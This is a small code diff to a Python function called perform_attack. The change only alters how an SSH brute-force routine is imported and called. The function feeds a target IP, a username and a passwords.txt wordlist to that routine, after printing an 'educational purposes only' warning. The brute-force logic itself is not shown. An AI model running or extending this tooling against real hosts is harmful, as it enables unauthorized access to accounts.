@@ -1,7 +1,7 @@
 def perform_attack():
     
     from app import findmy_password
-    from app import ssh_brute_force
+    import app.ssh_script as ssh_script
     import json
     
     print("WARNING: This script is intended for educational purposes only. Unauthorized access to computer systems is illegal and unethical.")
@@ -53,5 +53,5 @@ def perform_attack():
     TARGETUSER = target_user["username"]
     password_document = "passwords.txt"
     
-    ssh_brute_force(TARGETIP, TARGETUSER, password_document)
+    ssh_script.ssh_brute_force(TARGETIP, TARGETUSER, password_document)
     
